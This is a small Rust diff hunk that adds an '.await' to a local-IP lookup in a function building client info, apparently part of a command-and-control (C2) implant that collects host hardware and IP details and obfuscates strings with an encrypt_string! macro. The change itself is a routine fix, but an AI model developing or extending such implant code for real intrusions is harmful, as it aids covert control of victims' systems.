@@ -13,6 +13,7 @@ pub async fn build_client_info(client_id_opt: Option<String>) -> C2Result<Client
         .map_err(|e| C2Error::Other(format!("Failed to parse hardware info: {e}")))?;
 
     let ip = get_local_ip()
+        .await
         .unwrap_or_else(|_| encrypt_string!("127.0.0.1").parse().unwrap())
         .to_string();
 
